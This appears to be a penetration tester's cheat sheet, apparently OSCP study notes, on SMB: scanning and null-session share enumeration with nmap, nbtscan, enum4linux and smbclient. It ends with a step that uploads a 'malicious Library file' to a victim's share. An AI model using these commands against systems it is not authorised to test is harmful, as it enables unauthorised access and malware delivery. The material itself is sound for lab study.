139 , 445 

# use
```
smbclient -L //target -N
```
```
enum4linux -a target
```
### SCAN:
sudo nbtscan -r x.x.x.x/24
nmap -v -p 139,445 --script smb-os-discovery   ip
net view \\dc01 /all

### CONNECT:
	smbclient -L //IP [options]
	smbclient //IP/Share [options]
	smbclient \\\\<ip>\\<dir> 

-L 
-N (anonymous)
-U {user}
dir , cd , get , put

linux -> samba


| Category            | Command / Flag                             | Purpose (Short Explanation)                          |
| ------------------- | ------------------------------------------ | ---------------------------------------------------- |
| **Scan**            | `nbtscan -r x.x.x.x/24`                    | Discover Windows hosts and NetBIOS names on a subnet |
| **Scan**            | `nmap -p 139,445 IP`                       | Check if SMB ports are open                          |
| **Scan**            | `nmap --script smb-os-discovery -p 445 IP` | Identify OS, hostname, domain via SMB                |
| **Enum**            | `smbclient -L //IP`                        | List available SMB shares                            |
| **Enum**            | `smbclient -L //IP -N`                     | List shares using **anonymous (null) session**       |
| **Enum**            | `smbclient -L //IP -U user`                | List shares using specific credentials               |
| **Connect**         | `smbclient //IP/share`                     | Connect to a specific SMB share                      |
| **Connect**         | `smbclient //IP/share -N`                  | Connect anonymously                                  |
| **Connect**         | `smbclient //IP/share -U user`             | Connect with username                                |
| **Auth Flag**       | `-N`                                       | Do **not** prompt for password (null session)        |
| **Auth Flag**       | `-U <user>`                                | Specify username for authentication                  |
| **Inside SMB**      | `dir`                                      | List files inside the SMB share                      |
| **Inside SMB**      | `cd <dir>`                                 | Change directory inside the share                    |
| **Inside SMB**      | `get <file>`                               | Download a file from the share                       |
| **Inside SMB**      | `put <file>`                               | Upload a file to the share (**delivery step**)       |
| **Delivery (OSCP)** | `put config.Library-ms`                    | Deliver the malicious Library file to victim         |
| **Windows-side**    | `net view \\IP /all`                       | List SMB shares from a Windows system                |
smbclient //192.168.242.194/share -c 'put config.Library-ms'